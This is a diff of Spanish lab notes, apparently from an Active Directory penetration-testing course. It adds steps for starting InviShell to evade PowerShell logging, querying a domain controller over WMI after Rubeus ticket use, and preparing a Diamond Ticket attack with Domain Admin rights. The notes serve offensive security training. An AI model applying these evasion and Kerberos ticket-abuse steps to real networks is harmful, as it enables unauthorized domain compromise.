@@ -885,4 +885,17 @@ Comprobamos si el ticket esta presente
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
 ```
 
-Ahora intentaremos ejecu
+Ahora intentaremos ejecutar comandos *WMI* en el *Domain Controller* teniendo que iniciar primero una *InviShell*
+```shell
+[student97]
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+
+Y probaremos a ejecutar comandos *WMI*
+```shell
+[student97]
+Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
+```
+
+*LO - 10*
+Utilizaremos los privilejos de *Domain Admin* para ejecutar un *Diamond Ticket*
